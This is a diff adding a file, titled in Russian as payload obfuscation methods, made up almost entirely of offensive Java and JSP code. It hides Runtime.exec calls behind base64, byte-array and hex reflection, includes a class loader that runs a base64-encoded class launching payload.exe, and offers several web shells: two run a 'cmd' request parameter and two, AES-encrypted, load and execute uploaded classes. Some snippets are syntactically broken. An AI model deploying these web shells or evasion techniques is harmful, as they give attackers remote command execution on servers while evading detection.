@@ -1,0 +1,102 @@
+Методы обфускации полезной нагрузки
+
+import java.lang.reflect.InvocationTargetException;
+
+// ----------------------------------------- method base64 reflection --------------------------------------------
+public class base64exec {
+
+    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {
+        String[] x = new String( new BASE64Decoder().decodeBuffer(
+                "amF2YS5sYW5nLlJ1bnRpbWV8ZXhlY3xqYXZhLmxhbmcuU3RyaW5nfGdldFJ1bnRpbWV8Y2FsYw==") )
+                .split("\\|");
+        Class.forName(x[0]).getMethod(x[1],new Class[]{Class.forName(x[2])})
+                .invoke(Class.forName(x[0]).getMethod(x[3],null).invoke(null,null),new Object[]{
+                        x[4]});
+    }
+}
+// ----------------------------------------- class  --------------------------------------------
+
+public class BASE64Decoder {
+    public String decodeBuffer(String s) {
+        return "java.lang.Runtime|exec|java.lang.String|getRuntime|./payload";
+    }
+}
+
+// -----------------------------------------  class for base64 reflection --------------------------------------------
+package test;
+import java.io.IOException;
+public class calc {
+    @Override
+    public String toString() {
+        try {
+            Runtime.getRuntime().exec("payload.exe");
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+        return "OK";
+    }
+}
+
+$ base64 calc.class
+
+package test;
+public class loader {
+    public static class myLoader extends ClassLoader
+    public Class get(byte[] b)
+    {
+        return super.defineClass(b, 0, b.length);
+    }
+    public static void main(String[] args) throws Exception {
+        String classstr = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxx"; // base64 string from calc.class
+        BASE64Decoder code=new sun.misc.BASE64Decoder();
+        Class result = new myLoader().get(code.decodeBuffer(classstr)) // декодирование данных
+        System.out.println(result.newInstance().toString());
+    }
+
+// -----------------------------------------   method ASCII --------------------------------------------
+
+<%@ page contentType="text/html;charset=UTF-8"  language="java" %>
+<%
+    if(request.getParameter("cmd")!=null){
+        Class rt = Class.forName(new String(new byte[] { 106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101 }));
+        Process e = (Process) rt.getMethod(new String(new byte[] { 101, 120, 101, 99 }), String.class).invoke(rt.getMethod(new String(new byte[] { 103, 101, 116, 82, 117, 110, 116, 105, 109, 101 })).invoke(null), request.getParameter("cmd") );
+        java.io.InputStream in = e.getInputStream();
+        int a = -1;byte[] b = new byte[2048];out.print("<pre>");
+        while((a=in.read(b))!=-1){ out.println(new String(b)); }out.print("</pre>");
+    }
+%>
+// -----------------------------------------   method HEX --------------------------------------------
+
+<%@ page contentType="text/html;charset=UTF-8" import="javax.xml.bind.DatatypeConverter" language="java" %>
+<%
+    if(request.getParameter("cmd")!=null){
+        Class rt = Class.forName(new String(DatatypeConverter.parseHexBinary("6a6176612e6c616e672e52756e74696d65")));
+        Process e = (Process) rt.getMethod(new String(DatatypeConverter.parseHexBinary("65786563")), String.class).invoke(rt.getMethod(new String(DatatypeConverter.parseHexBinary("67657452756e74696d65"))).invoke(null), request.getParameter("cmd") );
+        java.io.InputStream in = e.getInputStream();
+        int a = -1;byte[] b = new byte[2048];out.print("<pre>");
+        while((a=in.read(b))!=-1){ out.println(new String(b)); }out.print("</pre>");
+    }
+%>
+----------------------------------------- method AES --------------------------------------------
+
+<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%>
+<%!class U extends ClassLoader{U(ClassLoader c){super(c);}
+public Class g(byte []b){return super.defineClass(b,0,b.length);}}%>
+<%if(request.getParameter("pass")!=null){String k=(""+UUID.randomUUID()).replace("-","").substring(16);session.putValue("u",k);
+out.print(k);return;}
+Cipher c=Cipher.getInstance("AES");
+c.init(2,new SecretKeySpec((session.getValue("u")+"").getBytes(),"AES"));
+BASE64Decoder decoder=new sun.misc.BASE64Decoder();
+new U(this.getClass().getClassLoader()).g(c.doFinal(decoder.decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);%>
+
+=<>=
+
+<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%>
+<%!class U extends ClassLoader{U(ClassLoader c){super(c);}
+public Class g(byte []b){return super.defineClass(b,0,b.length);}}%>
+<%if(request.getParameter("pass")!=null){String k=(""+UUID.randomUUID()).replace("-","").substring(16);session.putValue("u",k);
+out.print(k);return;}
+Cipher c=Cipher.getInstance("AES");
+c.init(2,new SecretKeySpec((session.getValue("u")+"").getBytes(),"AES"));
+ String uploadString= request.getReader().readLine();
+new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(uploadString))).newInstance().equals(pageContext);%>
